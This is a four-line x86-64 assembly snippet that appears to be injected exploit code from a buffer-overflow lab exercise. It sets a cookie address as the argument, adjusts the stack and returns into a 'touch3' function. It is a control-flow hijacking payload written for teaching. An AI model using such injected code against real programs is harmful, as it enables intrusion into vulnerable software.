mov $0x55681068, %rdi   # cookie addr
sub $0x80, %rsp         # stack protection
push $0x4019f0          # touch3 addr
ret
